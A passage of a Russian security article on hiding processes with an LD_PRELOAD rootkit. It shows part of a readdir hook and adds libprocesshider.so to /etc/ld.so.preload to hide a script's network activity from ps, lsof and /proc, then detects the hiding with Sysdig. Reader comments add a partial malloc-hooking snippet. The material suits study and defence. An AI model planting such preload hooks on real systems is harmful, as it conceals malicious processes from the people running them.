<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">strcmp(dir_name, &quot;/proc&quot;) == 0 &amp;&amp;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">get_process_name(dir-&gt;d_name, process_name) &amp;&amp;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">strcmp(process_name, process_to_filter) == 0) {</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">continue;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">}</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">}</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">break;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">}</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">return dir;</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">...</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p78"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">П</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ри­чем само имя про­цес­са </span><a name="code167"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">g</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">et_process_name() берет­ся из </span><a name="code168"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">proc/pid/stat.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p79"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">П</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ро­верим наши догад­ки. Для это­го запус­тим пред­лага­емый </span><a name="code169"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">e</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">vil_script.py в фоне:</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="panel17"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> ./evil_script.py 1.2.3.4 1234 &amp;</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code171"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">[</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">1] 3435</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p81"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">3</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">435 — это PID нашего работа­юще­го про­цес­са </span><a name="code173"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">e</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">vil_script.py. Про­верим вывод ути­литы htop и убе­дим­ся, что </span><a name="code174"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">e</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">vil_script.py при­сутс­тву­ет в спис­ке про­цес­сов.</span><img src="image1666940541ajs5gky12w.png" /><a name="figure1"></a><a href="https://static.xakep.ru/images/cc699363dc5abf9230816b317abd1a09/17404/htop.png"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; text-decoration: underline; color:#0000ff;">e</span></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; text-decoration: underline; color:#0000ff;">vil_script.py в спис­ке про­цес­сов htop</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p82"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">П</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ро­верим вывод ps и lsof для обна­руже­ния сетевой активнос­ти:</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="panel18"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> sudo ps aux | grep evil_script.py</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">root 3435 99.5 0.4 19272 8260 pts/1 R 11:48 63:20 /usr/bin/python ./evil_script.py 1.2.3.4 1234</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">root 3616 0.0 0.0 6224 832 pts/0 S+ 12:52 0:00 grep evil_script.py</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p84"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> sudo lsof -ni | grep evil_scri</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">evil_scri 3435 root 3u IPv4 41410 0t0 UDP 192.168.232.138:52676-&gt;1.2.3.4:1234</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p85"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Т</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">е­перь пос­мотрим, сущес­тву­ет ли дирек­тория с PID про­цес­са </span><a name="code177"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">e</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">vil_script.py:</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="panel19"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> sudo ls /proc | grep 3435</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">3435</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p87"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> cat /proc/3435/status</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">Name: evil_script.py</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">Umask: 0022</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">State: R (running)</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">Tgid: 3435</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">Ngid: 0</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">Pid: 3435</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">...</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p88"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">В</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">се пред­ска­зуемо. Теперь самое вре­мя добавить биб­лиоте­ку </span><a name="code180"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ibprocesshider.so в пред­загруз­ку гло­баль­но для всей сис­темы. Про­пишем ее в </span><a name="code181"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">etc/ld.so.preload:</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"># echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p89"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">П</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ро­веря­ем дирек­торию </span><a name="code183"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">proc, а так­же вывод lsof и ps.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="panel20"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> ls /proc | grep 3435</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code185"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> lsof -ni | grep evil_scri</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">ps aux | grep evil_script.py</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">root 3707 0.0 0.0 6244 900 pts/0 S+ 13:10 0:00 grep evil_script.py</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p91"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Р</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">е­зуль­тат налицо. Теперь в </span><a name="code186"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">proc нель­зя пос­мотреть дирек­торию с PID скрип­та </span><a name="code187"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">e</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">vil_script.py. Одна­ко ста­тус про­цес­са по‑преж­нему виден в фай­ле </span><a name="code188"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">proc/3435/status.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="panel21"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> cat /proc/3435/status</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">Name: evil_script.py</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">Umask: 0022</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">State: R (running)</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">Tgid: 3435</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">Ngid: 0</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">Pid: 3435</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">...</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p93"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">П</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">о­дыто­жим. В пер­вой час­ти статьи мы изу­чили методы перех­вата фун­кций и их изме­нение, что поз­воля­ет скры­вать рут­киты. А даль­ше про­дела­ли то же самое для скры­тия про­цес­сов от стан­дар­тных ути­лит монито­рин­га.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p94"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">К</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ак ты догады­ваешь­ся, прос­тые рут­киты, нес­мотря на все хит­рости, под­дают­ся детек­ту. Нап­ример, при помощи манипу­ляций с фай­лом </span><a name="code190"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">/</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">etc/ld.so.preload или изу­чения исполь­зуемых биб­лиотек через ldd.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p95"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Н</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">о что делать, если автор рут­кита нас­толь­ко хорош, что захукал все воз­можные фун­кции, ldd мол­чит, а подоз­рения на сетевую или иную активность все же есть?</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="toc07."></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> </span></p>
<h2 style=" margin-top:16px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">Sysdig как решение</span></h2>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p96"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">В</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> отли­чие от стан­дар­тных инс­тру­мен­тов, ути­лита </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">Sysdig</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> устро­ена по‑дру­гому. По архи­тек­туре она близ­ка к таким про­дук­там, как </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">libcap</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">, </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">tcpdump</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> и </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">Wireshark</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p97"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">С</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">пе­циаль­ный драй­вер sysdig-probe перех­ватыва­ет сис­темные события на уров­не ядра, пос­ле чего акти­виру­ется фун­кция ядра </span><a name="code191"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">t</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">racepoints, которая, в свою оче­редь, запус­кает обра­бот­чики этих событий. Обра­бот­чики сох­раня­ют информа­цию о событии в сов­мес­тно исполь­зуемом буфере. Затем эта информа­ция может быть выведе­на на экран или сох­ранена в тек­сто­вом фай­ле.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p98"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Д</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">а­вай пос­мотрим, как с помощью Sysdig най­ти </span><a name="code192"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">e</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">vil_script.py. К при­меру, по заг­рузке цен­траль­ного про­цес­сора:</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="panel22"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> sudo sysdig -c topprocs_cpu</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">CPU% Process PID</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="code194"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">-</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">--------------------------------------------</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">99.00% evil_script.py 5979</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">2.00% sysdig 5997</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">0.00% sshd 928</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">0.00% wpa_supplicant 474</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">0.00% systemd 909</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">0.00% exim4 850</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">0.00% sshd 938</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">0.00% su 948</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">0.00% in:imklog 472</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">0.00% in:imuxsock 472</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p100"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">М</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ож­но пос­мотреть выпол­нение ps. Бонусом Sysdig покажет, что динами­чес­кий ком­понов­щик заг­ружал поль­зователь­скую биб­лиоте­ку </span><a name="code195"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">l</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">ibprocesshide рань­ше, чем </span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">libc</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">:</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="panel23"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">$</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> sudo sysdig proc.name = ps</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">2731 00:21:52.721054253 1 ps (3351) &lt; execve res=0 exe=ps args=aux. tid=3351(ps) pid=3351(ps) (out)ptid=3111(bash) cwd=/home/gianluca fdlimit=1024 pgft_maj=0 pgft_min=62 vm_size=512 vm_rss=4 vm_swap=0</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">...</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">2739 00:21:52.721129329 1 ps (3351) &lt; open fd=3(/usr/local/lib/libprocesshider.so) name=/usr/local/lib/libprocesshider.so flags=1(O_RDONLY) mode=0</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">2740 00:21:52.721130670 1 ps (3351) &gt; read fd=3(/usr/local/lib/libprocesshider.so) size=832</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">...</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">2810 00:21:52.721293540 1 ps (3351) &gt; open</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">2811 00:21:52.721296677 1 ps (3351) &lt; open fd=3(/lib/x86_64-linux-gnu/libc.so.6) name=/lib/x86_64-linux-gnu/libc.so.6 flags=1(O_RDONLY) mode=0</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">2812 00:21:52.721297343 1 ps (3351) &gt; read fd=3(/lib/x86_64-linux-gnu/libc.so.6) size=832</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;">...</p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><a name="p102"></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">С</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">хо­жие фун­кции пре­дос­тавля­ют ути­литы </span><a href="https://sourceware.org/systemtap/"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600; text-decoration: underline; color:#0000ff;">SystemTap</span></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">, </span><a href="http://www.brendangregg.com/dtrace.html"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600; text-decoration: underline; color:#0000ff;">DTrace</span></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;"> и его све­жая пол­ноцен­ная замена — </span><a href="https://habr.com/ru/company/oleg-bunin/blog/500456/"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600; text-decoration: underline; color:#0000ff;">BpfTrace</span></a><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">.</span></p>
<p style="-qt-paragraph-type:empty; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'DejaVu LGC Sans'; font-size:12pt;"><br /></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:14pt; font-weight:600;">Примечание</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">OlegFlores</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">: В разделе Обработка сбоев пример исходников не тот.</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt; font-weight:600;">oza11</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">: Отличная статья, но есть ошибка, код функции </span><span style=" font-family:'FreeMono'; color:#6a1009;">malloc</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">, на самом деле является кодом функции </span><span style=" font-family:'FreeMono'; color:#6a1009;">readdir</span><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">, в главе «Обработка сбоев».</span></p>
<p style=" margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'DejaVu LGC Sans'; font-size:12pt;">Можно сделать так:</span></p>
<p style="-qt-paragraph-type:empty; margin-top:12px; margin-bottom:12px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#define _GNU_SOURCE</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">#include </span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">void* (*orig_malloc)(size_t size) = NULL;</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">void *malloc(size_t size)</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">{</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  void *ep = NULL;</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">  if (orig_malloc == NULL) {</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">    //Получение указателя на оригинальный malloc</span></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">    orig_malloc = (void*(*)(size_t *))dlsym(RTLD_NEXT, «malloc»);</span></p>
<p style="-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px; font-family:'FreeMono'; color:#6a1009;"><br /></p>
<p style=" margin-top:0px; margin-bottom:0px; margin-left:20px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-family:'FreeMono'; color:#6a1009;">    // Вызов malloc</span></p>
